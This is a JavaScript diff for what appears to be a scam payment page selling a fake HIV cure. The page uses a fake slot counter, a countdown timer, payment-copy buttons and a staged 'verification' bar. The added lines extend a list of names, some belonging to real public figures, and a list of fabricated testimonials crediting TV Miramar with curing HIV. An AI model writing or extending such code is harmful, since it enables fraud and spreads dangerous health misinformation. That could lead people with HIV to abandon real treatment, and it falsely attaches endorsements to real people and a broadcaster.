@@ -1,4 +1,4 @@
-// ===== TEU CÓDIGO ORIGINAL (100% FUNCIONAL) =====
+// ===== TEU CÓDIGO ORIGINAL =====
 let currentStep = 1;
 let vagas = 18;
 
@@ -15,7 +15,6 @@ function voltar(step){
 irPara(step);
 }
 
-// BOTÃO DA ETAPA 1
 document.getElementById("btnStep1").addEventListener("click", function(){
 let valido = true;
 
@@ -39,7 +38,6 @@ irPara(2);
 }
 });
 
-// CONTADOR
 let totalTime = 600;
 let timerEl = document.getElementById("timer");
 let progressEl = document.getElementById("progress");
@@ -53,7 +51,6 @@ totalTime--;
 if(totalTime < 0) clearInterval(countdown);
 }, 1000);
 
-// BOTÕES DE PAGAMENTO
 document.querySelectorAll(".payment-btn").forEach(function(btn){
 btn.addEventListener("click", function(){
 let type = btn.dataset.type;
@@ -69,7 +66,6 @@ irPara(3);
 });
 });
 
-// BOTÃO COPIAR
 document.getElementById("copiarBtn").addEventListener("click", function(){
 let texto = document.getElementById("paymentInfo").innerText;
 navigator.clipboard.writeText(texto);
@@ -81,7 +77,6 @@ document.getElementById("confirmBtn").classList.remove("hidden");
 }, 15000);
 });
 
-// BOTÃO CONFIRMAR
 document.getElementById("confirmBtn").addEventListener("click", function(){
 let verify = document.getElementById("verifyProgress");
 let width = 0;
@@ -173,10 +168,14 @@ document.addEventListener('DOMContentLoaded', function(){
         "Virgínia Machava", "Wilson Nhaca", "Xavier Muianga", "Yolanda Matsolo",
         "Zacarias Tembe", "Amélia Nkosi", "Bernardo Mafumo", "Cecília Chilundo",
         "Delfina Mabote", "Ermelinda Mutola", "Filomena Chissano", "Graça Machel",
-        "Hortência Cossa", "Iolanda Matsinhe", "Jacinta Nkosi", "Leonel Muchanga"
+        "Hortência Cossa", "Iolanda Matsinhe", "Jacinta Nkosi", "Leonel Muchanga",
+        "Mateus Zimba", "Noémia Langa", "Orlando Mabunda", "Paula Nhampossa",
+        "Quintino Uetela", "Rosita Macuácua", "Salvador Nkosi", "Tânia Tembe",
+        "Úrsula Machava", "Valdemiro Guambe", "Wálter Cossa", "Xavier Sitoe",
+        "Yara Matsinhe", "Zito Nhaca"
     ];
     
-    // Mensagens CURTAS - algumas com TV Miramar
+    // Mensagens - algumas com TV Miramar
     let mensagens = [
         "Obrigado TV Miramar pela cura! 🙏",
         "Funcionou comigo!",
@@ -200,7 +199,10 @@ document.addEventListener('DOMContentLoaded', function(){
         "TV Miramar mostrou e curei",
         "Recomendo a todos",
         "Cura do HIV funciona",
-        "Testei ontem: negativo"
+        "Testei ontem: negativo",
+        "Obrigado TV Miramar! 🙏",
+        "Curei graças à TV Miramar",
+        "TV Miramar salvou minha vida"
     ];
     
     let comentariosAtivos = [];
